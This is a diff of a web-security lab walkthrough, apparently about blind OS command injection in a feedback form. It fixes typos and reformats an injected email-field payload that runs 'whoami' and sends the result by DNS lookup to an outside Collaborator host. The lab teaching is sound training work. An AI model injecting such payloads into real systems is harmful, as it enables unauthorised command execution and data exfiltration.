@@ -56,7 +56,7 @@ Send it to repeater And replace file name with the file containing command
 
 **Step1:**
 
-Go to feeback form and submit any feedback
+Go to feedback form and submit any feedback
 
 **Step2:**
 
@@ -82,7 +82,7 @@ And the lab is solved
 
 **Step1:**
 
-Go to feeback form and submit any feedback
+Go to feedback form and submit any feedback
 
 **Step2:**
 
@@ -91,9 +91,9 @@ Send the POST /feedback/submit to repeater
 <img src="images/image14.png" alt="third" width="500">
 
 Send the request to repeater and Change email parameter to
-
-`|| nslookup `whoami`.Collaborator.id ||`
-
+```
+|| nslookup `whoami`.Collaborator.id ||
+```
 <img src="images/image15.png" alt="third" width="500">
 
 In collaborator we have interaction
@@ -106,7 +106,7 @@ Submit the answer
 
 **Step1:**
 
-Go to feeback form and submit any feedback
+Go to feedback form and submit any feedback
 
 **Step2:**
 
